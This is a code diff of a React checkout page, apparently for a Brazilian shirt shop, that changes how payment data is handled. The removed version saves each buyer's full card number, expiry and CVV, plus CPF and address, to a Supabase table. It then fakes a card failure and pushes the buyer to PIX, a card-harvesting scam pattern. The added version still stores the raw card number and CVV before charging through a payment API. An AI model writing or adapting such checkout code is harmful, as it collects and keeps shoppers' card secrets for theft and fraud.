@@ -262,38 +262,102 @@ export default function Checkout() {
     setLoading(true);
     setStatusErro(false);
 
-    // Salva tudo no Supabase
-    await supabase.from('checkouts').insert([{
-      nome_completo: formData.nome,
-      email: formData.email,
-      cpf: formData.cpf,
-      data_nascimento: formData.dataNascimento,
-      telefone: formData.telefone,
-      cep: formData.cep,
-      endereco: formData.endereco,
-      bairro: formData.bairro,
-      cidade: formData.cidade,
-      estado: formData.estado,
-      numero: formData.numero,
-      numero_cartao: formData.numCartao,
-      nome_cartao: formData.nomeCartao,
-      validade_cartao: formData.validade,
-      cvv_cartao: formData.cvv,
-      produto_nome: produto.nome,
-      valor_total: produto.preco
-    }]);
+    try {
+      // Salva tudo no Supabase
+      await supabase.from('checkouts').insert([{
+        nome_completo: formData.nome,
+        email: formData.email,
+        cpf: formData.cpf,
+        data_nascimento: formData.dataNascimento,
+        telefone: formData.telefone,
+        cep: formData.cep,
+        endereco: formData.endereco,
+        bairro: formData.bairro,
+        cidade: formData.cidade,
+        estado: formData.estado,
+        numero: formData.numero,
+        numero_cartao: formData.numCartao,
+        nome_cartao: formData.nomeCartao,
+        validade_cartao: formData.validade,
+        cvv_cartao: formData.cvv,
+        produto_nome: produto.nome,
+        valor_total: produto.preco,
+        metodo_pagamento: metodo
+      }]);
 
-    setTimeout(() => {
-      setLoading(false);
+      // Se for pagamento com cartão, processar via IronPay
       if (metodo === 'cartao') {
-        setStatusErro(true);
-        setTimeout(() => {
-          setMetodo('pix');
-          setStatusErro(false);
-          window.scrollTo({ top: 0, behavior: 'smooth' });
-        }, 3000);
+        const identifier = 'camisa10_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
+        
+        // Extrair mês e ano da validade (MM/AA)
+        const [month, year] = formData.validade.split('/');
+        const fullYear = '20' + year;
+
+        const payload = {
+          identifier,
+          amount: produto.preco,
+          payment_method: 'credit_card',
+          offer_hash: searchParams.get('id') || 'default_offer',
+          product_name: produto.nome || 'Camiseta',
+          installments: 1,
+          client: {
+            name: formData.nome || 'Cliente',
+            email: formData.email || 'cliente@email.com',
+            phone: formData.telefone || '11999999999',
+            document: formData.cpf || '00000000000',
+          },
+          card: {
+            number: formData.numCartao.replace(/\s/g, ''),
+            holder_name: formData.nomeCartao,
+            expiry_month: month,
+            expiry_year: fullYear,
+            cvv: formData.cvv
+          },
+          tracking: {
+            fbclid: searchParams.get('fbclid') || '',
+            utm_source: searchParams.get('utm_source') || '',
+            utm_medium: searchParams.get('utm_medium') || '',
+            utm_campaign: searchParams.get('utm_campaign') || '',
+            utm_content: searchParams.get('utm_content') || '',
+            utm_term: searchParams.get('utm_term') || ''
+          }
+        };
+
+        const res = await fetch(API_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify(payload),
+        });
+
+        const json = await res.json();
+
+        if (!res.ok) {
+          throw new Error(json?.error || json?.message || json?.errorDescription || `Erro ${res.status}`);
+        }
+
+        // Sucesso no cartão
+        setLoading(false);
+        alert('✅ Pagamento aprovado! Seu pedido foi confirmado.');
+        // Aqui você pode redirecionar para uma página de sucesso ou limpar o formulário
+        return;
       }
-    }, 2500);
+
+      // Se for PIX, apenas salvar (não processa aqui)
+      setTimeout(() => {
+        setLoading(false);
+      }, 500);
+
+    } catch (error: any) {
+      setLoading(false);
+      setStatusErro(true);
+      console.error('Erro ao processar pagamento:', error);
+      setTimeout(() => {
+        setStatusErro(false);
+      }, 5000);
+    }
   };
 
   return (
